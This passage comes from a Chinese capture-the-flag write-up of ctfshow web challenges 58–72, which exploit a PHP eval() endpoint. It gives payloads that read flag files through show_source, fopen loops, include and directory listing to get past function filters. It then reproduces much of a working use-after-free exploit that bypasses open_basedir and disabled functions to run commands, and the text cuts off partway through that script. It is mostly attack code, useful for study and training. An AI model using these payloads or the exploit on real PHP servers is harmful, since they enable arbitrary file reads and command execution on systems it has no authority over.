class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-comment">#payload3</span><br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span>(<span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$a</span>))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="Web59"><a href="#Web59" class="headerlink" title="Web59"></a>Web59</h2><p>过滤了更多函数</p><blockquote><p>这些还可以用</p><p>highlight_file()<br>show_source()<br>fgets()<br>file()</p></blockquote><p>Web58 payload 通杀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//在源代码</span><br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgetc</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> =<span class="hljs-title function_ invoke__">fgetcsv</span>(<span class="hljs-variable">$a</span>);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$line</span>);&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;1000&quot;</span>);<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fpassthru</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><h2 id="Web60"><a href="#Web60" class="headerlink" title="Web60"></a>Web60</h2><p>Web58 payload 通杀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>奇淫技巧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#通过复制，重命名读取php文件内容  </span><br><span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;flag.txt&quot;</span>);         <br><span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;flag.txt&quot;</span>);<br><span class="hljs-comment">#访问flag.txt </span><br></code></pre></td></tr></table></figure><h2 id="Web61-65"><a href="#Web61-65" class="headerlink" title="Web61-65"></a>Web61-65</h2><p>Web58和Web60 payload 通杀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="Web66-67"><a href="#Web66-67" class="headerlink" title="Web66-67"></a>Web66-67</h2><p>flag的位置变到了根目录</p><p>show_source()函数被禁用了换成highlight_file()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;/&quot;</span>)); <span class="hljs-comment">#查看根目录文件 print_r被过滤可以换var_dump</span><br><span class="hljs-comment"># 注意根目录是flag.txt</span><br>c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h2><p>读文件的所有函数都不能用了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;/&quot;</span>)); <span class="hljs-comment"># flag还是在根目录下</span><br><span class="hljs-comment"># 利用文件包含inculde()读取flag</span><br>c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="Web69-70"><a href="#Web69-70" class="headerlink" title="Web69-70"></a>Web69-70</h2><p>var_dump()被禁用了只能使用遍历数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 多种遍历数组姿势</span><br><span class="hljs-comment"># 1</span><br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;/&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;---&quot;</span>;&#125;<br><span class="hljs-comment"># 2 glob() 函数返回匹配指定模式的文件名或目录。返回的是数组</span><br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;   &quot;</span>;&#125;<br><span class="hljs-comment"># 3 </span><br>c=<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&quot; &quot;</span>);&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>你要上天吗？<br></code></pre></td></tr></table></figure><p>ob_get_contents() 返回输出缓冲区的内容</p><p>ob_end_clean()  清空（擦除）缓冲区并关闭输出缓冲</p><p>代码执行的大概流程是 <code>传参--命令执行--执行结果存在$s中--清空输出缓冲区--对$s进行过滤</code></p><p>由于清空输出缓冲区 传入的命令也就无法执行 这里要做的就是把代码终止在清空输出缓冲区之前使用exit()</p><p>强制退出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># flag.txt 在根目录下</span><br>c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><h2 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>你要上天吗？<br></code></pre></td></tr></table></figure><p>发现根目录下没有flag.txt了</p><p>存在open_basedir使用glob伪协议看下跟目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现flag发现在flag0.txt下</p><p>利用群主提供的uaf脚本绕过open_basedir进行命令执行</p><p>原始脚本:<a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 只需提交函数内容 记得url编码</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span> - <span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123;<br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123;<br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span 